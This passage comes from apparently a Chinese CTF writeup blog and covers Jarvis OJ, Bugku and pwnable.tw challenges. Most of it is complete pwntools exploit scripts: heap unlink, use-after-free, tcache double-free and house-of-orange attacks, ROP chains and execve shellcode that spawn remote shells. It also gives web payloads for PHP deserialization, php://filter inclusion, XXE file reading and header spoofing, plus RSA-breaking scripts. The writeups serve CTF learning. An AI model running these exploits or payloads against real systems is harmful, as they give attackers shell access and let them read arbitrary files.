", str(size)) r.sendafter("Enter your note: ", content) r.recvuntil("Your choice: ")def Edit(index, size, content): r.sendline("3") r.sendlineafter("Note number: ", str(index)) r.sendlineafter("Length of note: ", str(size)) r.sendafter("Enter your note: ", str(content)) r.recvuntil("Your choice: ")def Delete(index): r.sendline("4") r.sendlineafter("Note number: ", str(index)) r.recvuntil("Your choice: ")#r = process("./freenote_x64")r = remote("pwn2.jarvisoj.com", "9886")#libcso = ELF("/lib/x86_64-linux-gnu/libc.so.6")libcso = ELF("./libc-2.19.so")r.recvuntil("Your choice: ")New(0x1, "a" * 0x1)#0New(0x1, "a" * 0x1)#1New(0x1, "a" * 0x1)#2Delete(0)New(0x1, "a" * 0x1)#0#libc = u64(List()[3:9].ljust(8, "\x00")) - 0x3c4b61libc = u64(List()[3:9].ljust(8, "\x00")) - 0x3c2761New(0x1, "a" * 0x1)#3New(0x1, "a" * 0x1)#4New(0x1, "a" * 0x1)#5Delete(0)Delete(2)New(0x1000, "a" * 0x1000)#0Delete(0)New(0x8, "a" * 0x8)#0New(0x1, "a" * 0x1)#2heap = u64(List().split("\n1.")[0][11:15].ljust(8, "\x00")) - 0x1940Delete(0)Delete(1)Delete(2)Delete(3)payload = p64(0) + p64(0x81) + p64(heap + 0x30 - 0x18) + p64(heap + 0x30 - 0x10) + "a" * 0x60payload += p64(0x80) + p64(0x90) + "a" * 0x80payload += p64(0) + p64(0x91) + "a" * 0x80payload += p64(0) + p64(0x61) + "a" * 0x50New(0x200, payload)#0Delete(1)payload = p64(0x50) + p64(1) + p64(0x200) + p64(heap + 0x20)payload += p64(1) + p64(0x8) + p64(0x602018)payload += p64(1) + p64(0x8) + p64(heap + 0x68) + "/bin/sh\x00"payload = payload.ljust(0x200, "\x00")Edit(0, 0x200, payload)Edit(1, 0x8, p64(libc + libcso.symbols["system"]))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.sendline("4")r.sendlineafter("Note number: ", str(2))r.interactive() Backdoor 程序根据命令行参数异或0x6443得出的结果填充字符串,然后附加上backdoor. 所以只需要使backdoor被溢出写到返回地址即可.所以参数为0x24 ^ 0x6443. smashes 当ELF文件比较小的时候,不同区段可能会被多次映射. 劫持argv[0]即可. 123456789101112from pwn import *#r = process("./smashes")r = remote("pwn.jarvisoj.com", "9877")r.recvuntil("What's your name? ")r.sendline("a" * 0x218 + p64(0x400d20))r.recvuntil("overwrite the flag: ")r.send("\n")print r.recvuntil("terminated") typo 一道简单的arm栈溢出. 1234567891011121314from pwn import *pop_r0_r4_pc = 0x20904system = 0x10BA8bin_sh = 0x6c384offset = 112#r = process(["qemu-arm", "./typo"])r = remote("pwn2.jarvisoj.com", "9888")r.sendafter("Input ~ if you want to quit", "\n")payload = "a" * offset + p32(pop_r0_r4_pc) + p32(bin_sh) + p32(0) + p32(system)r.sendafter("------Begin------", payload)r.interactive() Item Board uaf,先用unsorted bin进行leak,然后通过覆写item结构体劫持控制流. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']def add(name, len, content): r.sendlineafter("choose:\n", "1") r.sendafter("Item name?\n", name) r.sendlineafter("Description's len?\n", str(len)) r.sendafter("Description?\n", content)def show(index): r.sendlineafter("choose:\n", "3") r.sendlineafter("Which item?\n", str(index))def dele(index): r.sendlineafter("choose:\n", "4") r.sendlineafter("Which item?\n", str(index))elf = change_ld('./itemboard', './ld.so.2')# r = elf.process(env = &#123;"LD_PRELOAD" : "./libc-2.19.so"&#125;)r = remote("pwn2.jarvisoj.com", "9887")add("w4rd3n\n", 0x100, "w4rd3n\n")#0add("w4rd3n\n", 0x60, "w4rd3n\n")#1add("w4rd3n\n", 0x60, "w4rd3n\n")#2dele(0)show(0)r.recvuntil("Description:")libc = u64(r.recvline()[:-1].ljust(8, "\x00")) + 0x7fa272c3c000 - 0x7fa272ffe7b8add("w4rd3n\n", 0x100, "w4rd3n\n")#3 = 0dele(1)dele(2)add("w4rd3n\n", 0x18, "a" * 0x10 + p64(libc + 0x46590)[:6] + "\n")#4 = 2dele(4)add("w4rd3n\n", 0x18, "/bin/sh\n")dele(1)# gdb.attach(r)print "libc: " + hex(libc)r.interactive() WEB PORT51 1curl --local-port 51 http://web.jarvisoj.com:32770/ LOCALHOST 1curl 'http://web.jarvisoj.com:32774/' -H 'X-Forwarded-For:127.0.0.1' Login 抓包发现. 1Hint: "select * from `admin` where password='".md5($pass,true)."'" 需要md5后的值字符形式为' or '类似的万能密码.例如md5(ffifdyop, ture) -&gt; 276f7227... == 'or'.... 神盾局的秘密 查看源代码. 1&lt;img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"&gt; 猜测出通过img参数解码索引文件,验证为base64.读取showimg.php,index.php. 123456789101112131415161718192021222324//showimg.php&lt;?php $f = $_GET['img']; if (!empty($f)) &#123; $f = base64_decode($f); if (stripos($f,'..')===FALSE &amp;&amp; stripos($f,'/')===FALSE &amp;&amp; stripos($f,'\\')===FALSE &amp;&amp; stripos($f,'pctf')===FALSE) &#123; readfile($f); &#125; else &#123; echo "File not found!"; &#125; &#125;?&gt;//index.php&lt;?php require_once('shield.php'); $x = new Shield(); isset($_GET['class']) &amp;&amp; $g = $_GET['class']; if (!empty($g)) &#123; $x = unserialize($g); &#125; echo $x;?&gt; index.php有反序列化漏洞,读取shield.php发现漏洞利用点. 123456789101112131415&lt;?php //flag is in pctf.php class Shield &#123; public $file; function __construct($filename = '') &#123; $this --&gt;file = $filename; &#125; function readfile() &#123; if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) &#123; return @file_get_contents($this-&gt;file); &#125; &#125; &#125;?&gt; payload. 1view-source:http://web.jarvisoj.com:32768/?class=O:6:%22shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125; api调用 右键发现是利用ajax发送json数据,Content-Type改为application/xml,xxe即可. 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE file [&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;file&gt;&amp;xxe;&lt;/file&gt; crypto hard RSA 读取公钥. 1openssl rsa -pubin -in pubkey.pem -text -modulus e = 2,考虑Rabin算法,首先分解一下p和q,得到. 12p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239 12345678910111213141516171819202122232425262728import gmpy2import stringN = 0xC2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDe = 2with open('flag.enc', 'r') as f: cipher = f.read().encode('hex') cipher = string.atoi(cipher, base=16)p = 275127860351348928173285174381581152299q = 319576316814478949870590164193048041239y_p = gmpy2.invert(p, q)y_q = gmpy2.invert(q, p)m_p = pow(cipher, (p + 1) / 4, p)m_q = pow(cipher, (q + 1) / 4, q)a = (y_p * p * m_q + y_q * q * m_p) % Nb = N - int(a)c = (y_p * p * m_q - y_q * q * m_p) % Nd = N - int(c)for i in (a, b, c, d): s = '%x' % i if len(s) % 2 != 0: s = '0' + s print s.decode('hex') Extremely hard RSA e = 3,明显是小公钥指数攻击.这使用multiprocessing来加快破解速度. 1234567891011121314151617181920212223242526272829import gmpy2from multiprocessing import Poolpool = Pool(4)N = 0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929e = 3with open('flag.enc', 'r') as f: cipher = f.read().encode('hex') cipher = int(cipher, 16)def calc(j): print j a, b = gmpy2.iroot(cipher + j * N, 3) if b == 1: m = a print '&#123;:x&#125;'.format(int(m)).decode('hex') pool.terminate() exit()def SmallE(): inputs = range(0, 130000000) pool.map(calc, inputs) pool.close() pool.join()if __name__ == '__main__': SmallE()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-bugku]]></title>
    <url>%2Fposts%2F254aad4f%2F</url>
    <content type="text"><![CDATA[逆向 游戏过关 OllyICE打开通过关键字符串找到程序主逻辑,往下走找到8个比较,把所有jmp目标改变(不必要),输入获得flag. WEB 本地包含 @$_REQUEST的意思是获得参数,包括@$_GET和@$_POST. 使用GET参数返回:Too Young Too Simple. 文件包含 http://123.206.87.240:8003/?hello=1);include%20$_GET[%27f%27];//&amp;f=php://filter/convert.base64-encode/resource=flag.php.Base64解码即可. 命令执行 http://123.206.87.240:8003/?hello=1);show_source(%27flag.php%27);//. 将flag.php文件读入变量 http://123.206.87.240:8003/?hello=file(%27flag.php%27). 变量1 匹配任意\w即[A-Za-z0-9_]的字符. $$args,使用全局变量GLOBALS即可. welcome to bugkuctf 第一步绕过,php可以使用file_get_contents("php://input",'r')读取post数据. 利用文件包含获取hint.php 123456789101112&lt;?phpclass Flag &#123;//flag.php public $file; public function __tostring() &#123; if(isset($this-&gt;file)) &#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125;&#125;?&gt; 获取index.php. 12345678910111213141516171819&lt;?php $txt = $_GET["txt"]; $file = $_GET["file"]; $password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf")) &#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file)) &#123; echo "不能现在就给你flag哦"; exit(); &#125; else &#123; include($file); $password = unserialize($password); echo $password; &#125; &#125; else &#123; echo "you are not the number of bugku ! "; &#125;?&gt; 由于php对象在被当作字符串使用时会自动执行__tostring方法,可以利用反序列化漏洞. http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}. flag在index里 本地文件包含,http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php.解密得flag. 管理员系统 最下面有密码的base64值,通过xff头伪造本地登录. 网站被黑 扫目录发现shell.php.爆破密码获得flag. 点击一百万次 查看源代码,直接控制台js构造请求. 123var form = $('&lt;form action="" method="post"&gt;' + '&lt;input type="text" name="clicks" value="' + clicks + '" hidden/&gt;' + '&lt;/form&gt;');$('body').append(form);form.submit(); 代码审计 extract变量覆盖 由于$file的内容大概率不是一个文件名,所以直接利用extract($_GET);把$shiyan设置为空即可. strcmp比较字符串 此漏洞适用与5.3之前版本的php,当函数strcmp接受到不能与字符串比较的类型的参数就会发生错误,并返回0.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-pwnable-tw]]></title>
    <url>%2Fposts%2F7ba23e1a%2F</url>
    <content type="text"><![CDATA[start Linux系统调用号表:位于/usr/include/asm/unistd.h,或者网站. read调用(mov al,3;int 80;)存在栈溢出,返回地址偏移为0x14. 返回地址后即为之前push的esp,返回地址溢出为0x8048087再次打印栈内容leak出esp,再次栈溢出跳到栈上执行shellcode. 利用80h中断中的sys_execve：x31xc9xf7xe1x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xb0x0bxcdx80. 12345678910111213141516171819from pwn import *# r = process("./start")r = remote("chall.pwnable.tw","10000")print r.recv()payload = "a" * 0x14 + p32(0x8048087)r.send(payload)esp = u32(r.recv()[:4])stack = esp + 0x10print "stack:" + hex(stack)payload = "a" * 0x14 + p32(stack + 4)payload += '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'# 这里使用asm(shellcraft.i386.linux.sh())会失败是因为read只有0x3cr.send(payload)r.interactive() orw 本题主要考察x86的shellcode编写,程序设置了白名单. 1234567891011121314from pwn import *context.log_level = 'debug'#r = process("./orw")r = remote("chall.pwnable.tw","10001")r.recvuntil("code:")payload = asm(shellcraft.i386.pushstr("/home/orw/flag"))payload += asm(shellcraft.i386.linux.syscall("SYS_open", "esp"))payload += asm(shellcraft.i386.linux.syscall("SYS_read", "eax", 0x804A040, 0x30))payload += asm(shellcraft.i386.linux.syscall("SYS_write", 1, 0x804A040, 0x30))r.send(payload)print r.recv() calc 具体漏洞. 当输入为00或者以运算符开头时会时eval时对v1赋值(a2[0]).这样下次eval时就可以任意写,写ROP链即可. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *r = process("./calc")i = 0def addROP(target): global i r.sendline("+" + str(361 + i)) now = int(r.recv()) if now &lt; target: r.sendline("+" + str(361 + i) + "+" + str(target - now)) else: r.sendline("+" + str(361 + i) + "-" + str(now - target)) print "ROP: " + hex(int(r.recv())) i += 1data = 0x080ec060mov_ret = 0x0809b30d#mov dword ptr [edx], eax ; retint_0x80 = 0x08049a21xoreax_ret = 0x080550d0inceax_ret = 0x0807cb7fpopeax_ret = 0x0805c34bpopebx_ret = 0x080481d1popedx_ret = 0x080701aapopecx_ebx_ret = 0x080701d1r.recvuntil("===\n")addROP(popedx_ret)addROP(data)addROP(popeax_ret)addROP(u32('/bin'))addROP(mov_ret)addROP(popedx_ret)addROP(data + 4)addROP(popeax_ret)addROP(u32('//sh'))addROP(mov_ret)addROP(popedx_ret)addROP(data + 8)addROP(xoreax_ret)addROP(mov_ret)addROP(popecx_ebx_ret)addROP(data + 8)addROP(data)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(inceax_ret)addROP(int_0x80)r.send('\n')r.interactive() dubblesort name的读取使用read可以leak. 在栈空间上排序且没有大小检查,通过scanf漏洞在不改变数据情况下增大排序数组从而ROP. 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context.log_level = 'debug'#r = process("./dubblesort",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)r = remote("chall.pwnable.tw","10101")r.recvuntil("name :")r.send("a" * 28)r.recvuntil("a" * 28)libc = u32(r.recvuntil(",")[0:4].ljust(4,"\x00")) - 0x1b0000 + 0x1dbcprint "libc: " + hex(libc)system = libc + 0x3a940shell = libc + 0x158e8bprint r.recvuntil("sort :")r.sendline(str(35))i = 0while(i &lt; 24): r.recvuntil("number : ") r.sendline("0") i += 1r.recvuntil("number : ")r.sendline("+")i += 1while(i &lt; 33): r.recvuntil("number : ") r.sendline(str(system)) i += 1r.recvuntil("number : ")r.sendline(str(shell))r.recvuntil("number : ")r.sendline(str(shell))r.interactive() hacknote free之后没有清除对应ptr数据,存在uaf. 先泄露libc基址,然后利用prt执行system("????;sh\0"),利用了system截断参数的特性,也可以&amp;&amp;sh\0等. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *#context.log_level = "debug"#r = process("./hacknote",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)r = remote("chall.pwnable.tw","10102")r.recvuntil("choice :")def add(size,content): r.send("1") r.recvuntil("Note size :") r.send(str(size)) r.recvuntil("Content :") r.send(content) r.recvuntil("choice :")def dele(index): r.send("2") r.recvuntil("Index :") r.send(str(index)) r.recvuntil("choice :")def prt(index): r.send("3") r.recvuntil("Index :") r.send(str(index)) data = r.recvuntil("choice :") return dataadd(0x80,"0")#0add(0x20,"0")#1dele(0)add(0x20,"0")#2libc = u32(prt(2)[4:8].ljust(4,"\x00")) - 0x1b0830print "libc: " + hex(libc)system = 0x3a940 + libcbinsh = 0x158e8b + libcadd(0xb0,"0")#3dele(1)dele(2)dele(3)add(0x80,"\x66" * 0x50 + p32(system) + ";sh\0")#4# gdb.attach(r)# raw_input("-" * 0x10)r.send("3")r.recvuntil("Index :")r.send("1")r.interactive() silver_bullet power_up函数中的strncat调用会在字符串后面添加一个'\x00',当拼接完的字符串长度为0x30时bullet的长度就会被覆盖为0,最后计算出的长度即为本次增加的bullet的长度,产生栈溢出. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *#context.log_level = "debug"r = process("./silver_bullet",env = &#123;"LD_PRELOAD":"./libc_32.so.6"&#125;)#r = remote("chall.pwnable.tw","10103")r.recvuntil("choice :")r.send("1\n")r.recvuntil("bullet :")r.send("a" * 0x2f + "\n")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("c")#gdb.attach(r)#input("------------")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("\xff" * 0x3 + "\x11" * 0x4 + p32(0x80484A8) + p32(0x8048954) + p32(0x804AFD0) + "a" * 0x1c)r.recvuntil("choice :")r.send("3\n")r.recvuntil("Oh ! You win !!\n")libc_base = u32(r.recvuntil("+++++\n")[0:4].ljust(4,'\0')) - 0xd41c0print hex(libc_base)r.recvuntil("choice :")r.send("1\n")r.recvuntil("bullet :")r.send("b" * 0x2f + "\n")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("c")r.recvuntil("choice :")r.send("2\n")r.recvuntil("bullet :")r.send("\xff" * 0x3 + "\x11" * 0x4 + p32(libc_base + 0x3a940) + p32(0x11111111) + p32(libc_base + 0x158e8b) + "b" * 0x1c)r.recvuntil("choice :")r.send("3\n")r.recvuntil("Oh ! You win !!\n")r.interactive() Tcache Tear 使用double free修改stdout泄露libc,再次利用修改free_hook成功getshell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *# context.log_level = "debug"# r = process("./tcache_tear")r = remote("chall.pwnable.tw", "10207")r.recvuntil("Name:")r.send(p64(0x602020))r.recvuntil("choice :")def add(size, content): r.send("1") r.recvuntil("Size:") r.send(str(size)) r.recvuntil("Data:") r.send(content) data = r.recvuntil("choice :") return datadef dele(): r.send("2") r.recvuntil("choice :")def info(): r.send("3") data = r.recvuntil("choice :") return dataadd(0x40, "hhhh")dele()dele()add(0x40, p64(0x602060))add(0x40, p64(0))add(0x40, p64(0))add(0x40, p8(0x60))data = add(0x40, p64(0xfbad3887) + p64(0) * 3 + p8(0x88))libc = u64(data[:8]) - 0x3ec760 -0x83print "libc: " + hex(libc)add(0x50, "hhhh")dele()dele()add(0x50, p64(libc + 0x3ed8e8))add(0x50, p64(0))add(0x50, p64(libc + 0x4f440))add(0x20, "/bin/sh\x00")r.send("2")# gdb.attach(r)r.interactive() BabyStack 比较密码使用的是strncmp,长度是用户输入的长度,通过登陆状态可以爆破出password,填满储存choice得缓冲区可以爆破出pie地址(没什么用). login和copy函数用的同一片栈区域,虽然copy函数限制了输入字符为0x3f.但因为read_stdin没有截断字符串,可以和login的输入连接从而溢出缓冲区. 由于溢出长度不够考虑使用one_gadget,发现strcpy调用后栈上留有libc地址构造输入使其被下一次strcpy复制到password缓冲区之后,再次爆破得libc地址. 溢出返回地址为one_gadget即可(注意,这里用了return 0). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *from LibcSearcher import *context.log_level = "debug"def login(pwd): r.send("1" + "a" * 15) r.sendafter("Your passowrd :", pwd) data = r.recvuntil("&gt;&gt; ") return datadef logout(): r.send("1" + "a" * 15) r.recvuntil("&gt;&gt; ")def pwn(): r.send("2" + "a" * 15)def copy(content): r.send("3" + "a" * 15) r.sendafter("Copy :", content) r.recvuntil("&gt;&gt; ")#r = process("./babystack", env = &#123;"LD_PRELOAD": "./libc_64.so.6"&#125;)r = remote("chall.pwnable.tw", "10205")r.recvuntil("&gt;&gt; ")password = ""i = 1while 1: if "Success" in login(password + p8(i) + p8(0)): password += p8(i) if len(password) == 16: break i = 1 logout() else: i = i + 1logout()pie = ""i = 1while 1: if "Success" in login(password + "1" + "a" * 15 + pie + p8(i) + p8(0)): pie += p8(i) if len(pie) == 6: break i = 1 logout() else: i = i + 1pie = u64(pie.ljust(8, "\x00")) - 0x1060#gdb.attach(r, "b * " + hex(pie) + " + 0xe43\n" + "b * " + hex(pie) + " + 0xebb\n")logout()login(password + "\x00" * 0x10 + "b" * 0x28)copy("a" * 0x3f)logout()libc = ""i = 1while 1: if "Success" in login("b" * 0x8 + libc + p8(i) + p8(0)): libc += p8(i) if len(libc) == 6: break i = 1 logout() else: i = i + 1libc = u64(libc.ljust(8, "\x00")) - 0x78439success("password: " + password.encode('hex'))success("pie: " + hex(pie))success("libc: " + hex(libc))logout()login("b" * 0x8 + "\x00" * 0x18 + "b" * 0x20 + password + "b" * 0x18 + p64(libc + 0x45216))copy("a" * 0x3f)#gdb.attach(r, "b * " + hex(pie) + " + 0x1052")pwn()r.interactive() seethefile 读取/proc/self/maps文件泄露libc. edit溢出file文件指针,伪造file结构体,劫持vtable中的close指针为system即可(结构体除伪造部分都是模仿现有文件指针,避免报错). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *#context.log_level = "debug"libc = ELF('libc_32.so.6')libc_system = libc.symbols['system']libc_binsh = next(libc.search("/bin/sh"))#r = process("./seethefile")r = remote('chall.pwnable.tw', 10200)def Open(name): r.sendline("1") r.recvuntil("see :") r.sendline(name) r.recvuntil("choice :")def Read(): r.sendline("2") r.recvuntil("choice :")def Write(): r.sendline("3") data = r.recvuntil("\n-")[:-2] r.recvuntil("choice :") return datadef Close(): r.sendline("4") r.recvuntil("choice :")def Edit(name): r.sendline("5") r.recvuntil("name :") r.sendline(name)r.recvuntil("choice :")#gdb.attach(r, "b * 0x8048B0F")Open("/proc/self/maps")Read()Read()data = Write()Close()libc = int(data.split("\n")[1].split("-")[0], 16)payload = 0x20 * "\x00"payload += p32(0x804B284) + "/bin/sh\x00" + p32(0) * 0xb + p32(0x804B260) + p32(3) + p32(0) * 3 + p32(0x804b260) + p32(0xffffffff) * 2 + p32(0) + p32(0x804b260) + p32(0) * 14 + p32(0x804B31C) + p32(0) * 2 + p32(0x804B260) * 15 + p32(libc + libc_system) + p32(0x804b260) * 3Edit(payload)sleep(1)r.sendline("./home/seethefile/get_flag")r.recvuntil("magic :")r.sendline("Give me the flag\x00")print r.recv() 3x17 动态调试发现main函数就是一个任意写,通过写.fini_array段的两个指针(先调用array[1],再调用array[0])控制程序流程写ROP链,通过leave修改rsp迁移栈. 123456789101112131415161718192021222324252627282930313233from pwn import *r = remote("chall.pwnable.tw", "10105")#r = process('./3x17')def send_data(addr, data): r.recvuntil('addr:') r.sendline(str(addr)) r.recvuntil('data:') r.send(data)fini_array = 0x4B40F0main_func = 0x401B6Dloop_func = 0x402960pop_rax = 0x41e4afpop_rdi = 0x401696pop_rsi = 0x406c30pop_rdx = 0x446e35syscall = 0x471db5main_leave_ret = 0x401C4B#rsp = rbp = 0x4B40f8start = 0x4B4100send_data(fini_array, p64(loop_func) + p64(main_func))send_data(start, p64(pop_rax) + p64(0x3b))send_data(0x4BA9A0, "/bin/sh\x00")send_data(start + 0x10, p64(pop_rdi) + p64(0x4BA9A0))send_data(start + 0x20, p64(pop_rsi) + p64(0))send_data(start + 0x30, p64(pop_rdx) + p64(0))send_data(start + 0x40, p64(syscall))send_data(fini_array, p64(main_leave_ret))r.interactive() Death Note 未检测index,got表可改且堆可执行,写shellcode即可. 关于printable shellcode(Printable字符的指ascii码在0x1f和0x7f区间,不包含边界),有以下可用的的gadget. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970; 数据传送push/pop eax...pusha/popa; 算术运算inc/dec eax...sub al, numsub byte ptr [eax... + num], al dl...sub byte ptr [eax... + num], ah dh...sub dword ptr [eax... + num], esi edisub word ptr [eax... + num], si disub al dl..., byte ptr [eax... + num]sub ah dh..., byte ptr [eax... + num]sub esi edi, dword ptr [eax... + num]sub si di, word ptr [eax... + num]; 逻辑运算and al, numand dword ptr [eax... + num], esi ediand word ptr [eax... + num], si diand ah dh..., byte ptr [ecx edx... + num]and esi edi, dword ptr [eax... + num]and si di, word ptr [eax... + num]xor al, numxor byte ptr [eax... + num], al dl...xor byte ptr [eax... + num], ah dh...xor dword ptr [eax... + num], esi edixor word ptr [eax... + num], si dixor al dl..., byte ptr [eax... + num]xor ah dh..., byte ptr [eax... + num]xor esi edi, dword ptr [eax... + num]xor si di, word ptr [eax... + num]; 比较指令cmp al, numcmp byte ptr [eax... + num], al dl...cmp byte ptr [eax... + num], ah dh...cmp dword ptr [eax... + num], esi edicmp word ptr [eax... + num], si dicmp al dl..., byte ptr [eax... + num]cmp ah dh..., byte ptr [eax... + num]cmp esi edi, dword ptr [eax... + num]cmp si di, word ptr [eax... + num]; 转移指令push 56hpop eaxcmp al, 43hjnz lable; &lt;=&gt; jmp lable; 交换al, ahpush eaxxor ah, byte ptr [esp] ; ah ^= alxor byte ptr [esp], ah ; al ^= ahxor ah, byte ptr [esp] ; ah ^= alpop eax; 清零push 44hpop eaxsub al, 44h; eax = 0push esipush esppop eaxxor [eax], esi; esi = 0 观察当前寄存器状态,发现eax为参数,劫持free@got.exp. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from pwn import *context.log_level = 'debug'def add(index, name): r.sendline("1") r.sendlineafter("Index :", str(index)) r.sendlineafter("Name :", name) r.recvuntil("Your choice :")def show(index): r.sendline("2") r.sendlineafter("Index :", str(index)) data = r.recvuntil("Your choice :") return datadef dele(index): r.sendline("3") r.sendlineafter("Index :", str(index)) r.recvuntil("Your choice :")#r = process("./death_note")r = remote("chall.pwnable.tw", "10201")r.recvuntil("Your choice :")#gdb.attach(r, "b * 0x8048490")shellcode = ''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx /* set ebx to '/bin///sh' */ push 0x60606060 push 0x60606060 /* padding */ push 0x60 pop edx sub byte ptr [eax + 0x32], dl sub byte ptr [eax + 0x33], dl sub byte ptr [eax + 0x33], dl /* set 'int 0x80' */ push 0x6b push 0x56 pop eax sub al, 0x56 push eax push eax pop ecx pop edx pop eax sub al, 0x60 /* set edx = 0, ecx = 0, eax = 0xb */ /* int 0x80 */'''#print len(asm(shellcode))add(-19, asm(shellcode) + "\x2d\x40")#int 0x80 =&gt; \xcd\x80r.sendline("3")r.sendlineafter("Index :", str(-19))r.interactive() BookWriter 满足house_of_orange利用条件,不过打远程貌似由于一次性发送payload太长失败. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778from pwn import *context.log_level = 'debug'def add(size, content): r.sendline("1") r.sendlineafter("Size of page :", str(size)) r.sendafter("Content :", content) r.recvuntil("Your choice :")def view(index): r.sendline("2") r.sendlineafter("Index of page :", str(index)) r.recvuntil("Content :\n") data = r.recvuntil("Your choice :") return datadef edit(index, content): r.sendline("3") r.sendlineafter("Index of page :", str(index)) r.sendafter("Content:", content) r.recvuntil("Your choice :")def info(): r.sendline("4") r.recvuntil("Author : ") data = r.recvuntil("Do you want") r.sendlineafter("(yes:1 / no:0) ", str(0)) return data#r = process("./bookwriter")r = process("./bookwriter", env = &#123;"LD_PRELOAD" : "./libc_64.so.6"&#125;)#r = remote("chall.pwnable.tw", "10304")r.sendafter("Author :", "a" * 0x40)r.recvuntil("Your choice :")add(0x108, "a" * 0x108)#0edit(0, "a" * 0x108)heap = u64(info()[0x40:].split("\n")[0].ljust(8, "\x00")) - 0x10#leak heapadd(0x108, "a" * 0x108)#1edit(1, "a" * 0x108)edit(1, "a" * 0x108 + "\xd1\x0d\x00")add(0x1000, "a" * 1)#2add(0x300, "a" * 0x8)#3libc = u64(view(3).split("a" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c4178add(0x8, "a" * 0x8)#4add(0x8, "a" * 0x8)#5add(0x8, "a" * 0x8)#6edit(0, "\x00")add(0x8, "a" * 0x8)#7add(0x8, "a" * 0x8)#7payload = "\x00" * 0x108 + p64(0x1011) + p64(0xa30) + p64(0x11111111) * ((0x1000 - 0x8) / 8)payload += p64(0) + p64(0x111) + "a" * 0x108 + p64(0x311) + "\x00" * 